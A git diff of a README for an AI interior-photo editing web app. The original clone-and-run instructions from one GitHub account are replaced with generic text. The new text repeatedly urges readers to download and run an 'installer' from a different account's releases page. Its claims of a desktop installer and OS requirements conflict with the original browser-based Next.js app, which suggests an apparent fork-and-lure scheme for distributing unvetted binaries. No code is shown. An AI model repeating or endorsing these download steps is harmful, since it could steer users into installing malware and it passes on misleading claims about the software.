@@ -1,102 +1,60 @@
-#### 🚀 AI-Powered Interior Photo Editing for Cleaning, Staging & Adding Items
+# 🏡 Room-Stage-Clean-Add-AI - Transform Your Spaces with AI
 
-The app is a real estate image editing application that uses advanced AI models to transform interior photos. It lets you clean unwanted objects, stage rooms in different styles, and add furniture or décor with just a few clicks or prompts. The app makes creating high-quality, photorealistic room visuals fast, intuitive, and perfect for real estate listings or interior design mockups.
+## 🚀 Getting Started
+Welcome to Room-Stage-Clean-Add-AI! This application helps you improve your interior spaces using advanced AI technology. Whether you need to clean, stage, or add items to a room, this tool simplifies the process.
 
-#### ✨Enhanced with Multiple Angles and Video Generation
+## 📥 Download the Application
+[![Download Room-Stage-Clean-Add-AI](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/stvishwa06/Room-Stage-Clean-Add-AI/releases)
 
-Users can generate new views from any camera angle and create dynamic videos from static images. It offers full control over azimuth (horizontal rotation), elevation (vertical angle), and zoom (camera distance), allowing realistic visualizations from floor-level, eye-level, or top-down perspectives. Videos can then be generated with smooth motion, perfect for virtual walkthroughs, interior design, or real estate presentations.
+## 📝 Features
+- **AI Cleaning**: Automatically enhance the look of your spaces.
+- **Staging**: Add furniture and decor to visualize possibilities.
+- **Item Addition**: Easily place new items in your room.
+- **Multi-Angle Camera Control**: View your space from different angles.
+- **Video Generation**: Create videos to showcase your designs.
+- **Photorealistic Visualization**: Get realistic images of your interiors.
 
-#### 🏠 Enhanced with AI Interior 3D Visualizer
+## 🖥️ System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later.
+- **Processor**: Intel i5 or equivalent.
+- **RAM**: Minimum 8 GB.
+- **Storage**: At least 2 GB of free space.
 
-Turn your 2D interior photos into interactive 3D models with AI-powered tools! Perfect for real estate listings, interior design mockups, and furniture visualization.
+## 💡 How to Download and Install
+1. Visit the [Releases page](https://github.com/stvishwa06/Room-Stage-Clean-Add-AI/releases).
+2. Find the latest version listed on the page.
+3. Click on the version you want to install.
+4. Download the appropriate installer for your operating system.
+5. Once the download is complete, locate the file in your downloads folder.
 
----
-### Features 🚀
+## 🔧 Installing the Application
+1. Double-click the downloaded file to start the installation.
+2. Follow the on-screen instructions to complete the installation.
+3. Launch the application from your desktop or start menu.
 
-#### 1. Upload & Manage Images 📸
-- Upload room photos and automatically store them in `fal.storage`.
-- All images are saved in `localStorage`, so your work persists even after refreshing the page.
-- Thumbnail strip at the bottom shows all originals, cleaned versions, staged rooms, and added items.
-- Hover to preview, right-click for options: set for operations, download, or delete.
+## 🎨 How to Use the Application
+1. Open Room-Stage-Clean-Add-AI.
+2. Choose the task you want to perform: clean, stage, or add items.
+3. Follow the prompts to upload your room photo.
+4. Use the tools provided to make your edits.
+5. Save or export your work to share with others.
 
-#### 2. Cleaning Mode 🖌️❌
-- Remove unwanted objects with two methods:  
-  1. **Prompt Mode** – simply type what to remove (e.g., "remove old sofa").  
-  2. **Polygon Selection** – draw a polygon around the object for precise removal.
-- After processing, compare before/after images side-by-side or with a slider.
+## 📄 Additional Resources
+For detailed guides and tips on using the application, check our documentation page. This page includes tutorials, FAQs, and troubleshooting guides to help you get the most out of Room-Stage-Clean-Add-AI.
 
-#### 3. Staging Mode 🎨🛋️
-- Transform empty rooms into fully furnished spaces with style presets:  
-  - Industrial  
-  - Scandinavian  
-  - Mid-Century  
-  - Bohemian  
-  - Art Deco
-- Modify presets or write custom prompts.
-- Uses specialized interior design models to generate photorealistic staged rooms.
+## 🗣️ Feedback and Support
+We welcome your feedback to help us improve the application. If you face any issues or have suggestions, please reach out through the Issues tab on our GitHub page.
 
-#### 4. Adding Items 🏺📸
-- Add new items with:  
-  1. **Prompt only** – e.g., "add a blue sofa".  
-  2. **Prompt + Reference Image** – guides AI to match the reference.
-- Supports polygon selection for precise placement.
+## 🔗 Explore More
+We cover various topics including:
+- 3D Modeling
+- Artificial Intelligence
+- Interior Design
+- Virtual Staging
 
-#### 5. Multiple Angles & Camera Control 🔄📐
-- Generate new views of a room from different camera positions using a single image.  
-- Control **azimuth** (horizontal rotation), **elevation** (vertical angle), and **zoom** (camera distance) to visualize spaces from floor-level, eye-level, or top-down perspectives.
+Feel free to explore these concepts as you enhance your interior spaces!
 
-#### 6. Video Generation 🎥✨
-- Convert static room images into smooth, immersive videos.  
-- Use simple text prompts such as *“360-degree rotation”* or *“slow pan across the room”*, and select a duration of 5 or 10 seconds to create realistic walkthroughs, virtual tours, or dynamic presentations.
+## 🔗 Download Again
+To download Room-Stage-Clean-Add-AI, click here: [Download Now](https://github.com/stvishwa06/Room-Stage-Clean-Add-AI/releases). 
 
-#### 7. AI Interior 3D Visualizer 🏠
-- Turn your 2D interior photos into **interactive 3D models** with AI-powered tools.  
-- Perfect for **real estate listings, interior design mockups, and furniture visualization**.  
-- Supports point-based selection (positive/negative points) to include or exclude objects.  
-- Generates fully textured GLB files that can be viewed and rotated in Google’s `<model-viewer>`.
-
-
----
-
-#### 👉 Links & Resources
-
-- [Fal.ai Homepage](https://fal.ai/)  
-- [Apartment Staging Model](https://fal.ai/models/fal-ai/flux-2-lora-gallery/apartment-staging)  
-- [Object Removal Model](https://fal.ai/models/fal-ai/object-removal)  
-- [Object Removal Mask Model](https://fal.ai/models/fal-ai/object-removal/mask)  
-- [Inpaint Model](https://fal.ai/models/fal-ai/flux-kontext-lora/inpaint)  
-- [Fill Model](https://fal.ai/models/fal-ai/flux-pro/v1/fill) 
-- [Multiple Angles Model](https://fal.ai/models/fal-ai/qwen-image-edit-2511-multiple-angles) 
-- [Image to Video Model](https://fal.ai/models/fal-ai/kling-video/v2.5-turbo/pro/image-to-video)  
-- [3D Objects](https://fal.ai/models/fal-ai/sam-3/3d-objects) 
----
-
-#### 🚀 Clone and Run
-
-```bash
-# Clone the repository
-git clone https://github.com/Ashot72/Room-Stage-Clean-Add-AI
-
-# Navigate into the project directory
-cd Room-Stage-Clean-Add-AI
-
-# Copy .env.local,example to create a new .env.local file, then add your FAL_KEY.
-cp env.local.example .env.local
-
-# Install dependencies
-npm install
-
-# Start the development server
-npm run dev
-
-# The app will be available at http://localhost:3000
-```
-#### 🛠 Debugging in VS Code
-
-- Open the **Run** view (`View → Run` or `Ctrl+Shift+D`) to access the debug configuration
-
-📺 **Video: (Cleaning, Staging & Adding Items)** [Watch on YouTube](https://youtu.be/yqsgr9Z5MJo) 
-
-📺 **Video: (Multiple Angles and Video Generation)** [Watch on YouTube](https://youtu.be/DKne0nvZxJA) 
-
-📺 **Video: (3D Interiors from Photos with)** [Watch on YouTube](https://youtu.be/NE8awddiMhM) 
+Enjoy transforming your spaces!
